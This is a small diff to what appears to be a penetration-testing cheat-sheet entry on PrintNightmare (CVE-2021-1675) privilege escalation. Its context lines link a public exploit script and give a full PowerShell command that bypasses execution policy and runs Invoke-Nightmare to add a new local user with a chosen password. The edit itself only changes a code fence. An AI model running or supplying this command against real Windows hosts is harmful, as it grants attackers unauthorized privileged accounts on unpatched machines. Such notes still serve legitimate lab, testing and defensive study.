@@ -4,7 +4,7 @@ description: PrintNightmare Local / Remote Privilege Escalation
 
 # print nightmare
 
-```
+````
 # no DLLs needed
 https://github.com/calebstewart/CVE-2021-1675
 powershell.exe -exec bypass -Command "& {Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser 'kashz' -NewPassword 'iamkashz@123'}"
